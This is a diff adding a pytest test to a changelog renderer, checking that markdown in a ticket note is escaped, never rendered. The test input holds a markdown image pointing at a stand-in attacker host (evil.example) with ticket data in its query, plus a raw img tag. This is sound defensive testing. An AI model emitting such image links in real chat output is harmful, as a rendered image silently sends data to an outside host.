@@ -112,6 +112,17 @@ def test_a_merged_bullet_ends_with_every_ticket_it_covers():
     )
 
 
+def test_markdown_in_a_note_is_shown_as_written_never_rendered():
+    """An image the chat rendered would be loaded at once, sending whatever its address carries."""
+    entry = _entry("ENG-12", ChangelogSection.FIXES, "Export ![x](https://evil.example/?d=ENG-13) <img src=x> *now*")
+
+    assert ChangelogRenderer.bullet(entry, link_tickets=True, keys_first=True) == (
+        "- **[[ENG-12](https://jira.example.com/browse/ENG-12)]** "
+        "Export !\\[x\\](https://evil.example/?d=ENG-13) \\<img src=x\\> \\*now\\*\n"
+    )
+    assert ChangelogRenderer.title("2.0_beta [rc]", ReleaseLanguage.EN, _T) == "## Release notes 2.0\\_beta \\[rc\\]\n"
+
+
 @pytest.mark.parametrize(
     ("merge_related_tickets", "bullet"),
     [
